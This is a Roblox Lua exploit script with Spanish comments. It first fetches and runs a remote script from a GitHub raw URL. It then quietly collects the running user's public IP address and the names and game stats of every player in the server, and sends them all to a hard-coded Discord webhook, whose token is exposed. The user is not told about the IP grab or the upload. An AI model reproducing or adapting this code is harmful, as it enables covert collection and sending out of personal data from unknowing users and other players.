loadstring(game:HttpGet("https://raw.githubusercontent.com/Fernanflop091o/Queuet/refs/heads/main/Afk.lua"))()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local discordWebhookUrl = "https://discord.com/api/webhooks/1286118077829742593/KbfczS76YlMW7x_Q9vbA60XRE78_xc9uvDZOGkzLU5AEfP-fH1iX-_P6YzBg7d6-WiJn"
local playerDataFile = "PlayerData.json"

-- Verifica si el archivo existe
local function fileExists(filename)
    return isfile(filename)
end

-- Carga los datos del jugador desde el archivo
local function loadPlayerData()
    if fileExists(playerDataFile) then
        local fileContents = readfile(playerDataFile)
        return HttpService:JSONDecode(fileContents) or {}
    end
    return {}
end

-- Guarda los datos del jugador en el archivo
local function savePlayerData(data)
    writefile(playerDataFile, HttpService:JSONEncode(data))
end

-- Verifica si ya se enviaron datos para el jugador
local function hasPlayerData(ip)
    local playerData = loadPlayerData()
    return playerData[ip] ~= nil
end

-- Guarda la IP del jugador
local function savePlayerIP(ip)
    local playerData = loadPlayerData()
    playerData[ip] = true
    savePlayerData(playerData)
end

-- Obtiene la IP del jugador
local function getPlayerIP()
    local ip = "N/A"
    local success, response = pcall(function()
        return game:HttpGet("https://v4.ident.me/")
    end)
    if success then
        ip = response
    else
        warn("Error al obtener IP:", response)
    end
    return ip
end

-- Obtiene información de todos los jugadores
local function getAllPlayerData()
    local playerDataList = {}
    for _, player in pairs(Players:GetPlayers()) do
        local playerData = {}
        local playerName = player.Name
        local playerDisplayName = player.DisplayName

        local folderData = game.ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
        if folderData then
            local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
            local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0

            local combinedLabel = string.format("Jugador: %s\nApodo: %s\nRebirth: %d\nStrength: %d",
                playerName, playerDisplayName, rebirthValue, strengthValue)

            table.insert(playerDataList, combinedLabel)
        end
    end
    return table.concat(playerDataList, "\n\n")
end

-- Envía la información del jugador a Discord
local function sendPlayerInfoToDiscord()
    local ip = getPlayerIP()

    -- Verificar si ya se enviaron datos para este jugador
    if hasPlayerData(ip) then
        print("Ya se han enviado datos para este jugador.")
        return
    end

    local allPlayerData = getAllPlayerData()

    local dataToSend = {
        ["embeds"] = {
            {
                ["description"] = "Jugadores del juego:\n\n" .. allPlayerData,
                ["color"] = 0x00ff00,
                ["title"] = "Estadísticas de los jugadores",
                ["fields"] = {
                    {
                        ["name"] = "IP",
                        ["value"] = ip,
                        ["inline"] = true
                    }
                }
            }
        }
    }

    local success, response = pcall(function()
        return http_request({
            Url = discordWebhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(dataToSend)
        })
    end)

    if not success then
        warn("Error al enviar datos a Discord:", response)
    else
        print("Datos enviados a Discord exitosamente.")
        savePlayerIP(ip) -- Guardar la IP después de enviar
    end
end

-- Ejecutar la función para enviar información a Discord
Players.PlayerAdded:Connect(function(player)
    sendPlayerInfoToDiscord()
end)
